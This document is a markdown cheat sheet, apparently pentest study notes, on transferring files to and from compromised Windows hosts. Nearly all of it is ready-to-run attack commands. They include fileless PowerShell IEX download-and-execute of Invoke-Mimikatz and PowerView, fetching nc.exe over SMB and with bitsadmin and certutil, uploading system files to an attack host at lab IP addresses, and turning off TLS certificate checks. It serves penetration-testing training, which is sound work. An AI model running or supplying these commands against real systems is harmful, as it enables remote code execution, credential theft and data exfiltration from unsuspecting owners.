---
layout: default
---
# File Transfer

## Windows File Transfer Method

We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it

```
PS C:\> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("content"))
```
#### PowerShell DownloadFile Method

We can specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name.

```
PS C:\>(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```
```
PS C:\>(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

#### PowerShell DownloadString - Fileless Method

```
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

```
PS C:\> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
> IEX also accepts pipeline input.

#### PowerShell Invoke-WebRequest

From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.

```
PS C:\> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
#### Common Errors with PowerShell

```
PS C:\> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
```

This can be bypassed using the parameter -UseBasicParsing.

```
PS C:\> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command

```
PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException

PS C:\> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB Downloads

#### Copy a File from the SMB Server

```
C:\> copy \\192.168.220.133\share\nc.exe
```
> New versions of Windows block unauthenticated guest access, as we can see in the following command:

> To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine

#### Mount the SMB Server with Username and Password

```
C:\> net use n: \\192.168.220.133\share /user:test test
```

```
C:\> copy n:\nc.exe
```

### Upload Operations

#### PowerShell Base64 Encode & Decode

```
PS C:\> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)
```

```
PS C:\> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```
> We copy this content and paste it into our attack host, use the base64 command to decode it, and use the md5sum application to confirm the transfer happened correctly.

#### PowerShell Web Uploads

We can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses **Invoke-RestMethod** to perform the upload operations. The script accepts two parameters **-File**, which we use to specify the file path, and **-Uri**, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host

```
PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```
#### PowerShell Base64 Web Upload

Another way to use PowerShell and base64 encoded files for upload operations is by using **Invoke-WebRequest** or **Invoke-RestMethod** 

```
PS C:\> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

### LOLBAS

use CertReq.exe as an example

#### Upload win.ini to our attackbox

```
C:\> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

#### Bitsadmin Download function

The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.

```
PS C:\> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\Desktop\nc.exe
```
> PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.

```
PS C:\> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

#### Certutil

Download a File with Certutil

```
C:\> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

```
C:\> certutil -urlcache -split -f http://10.10.10.32/nc.exe
```

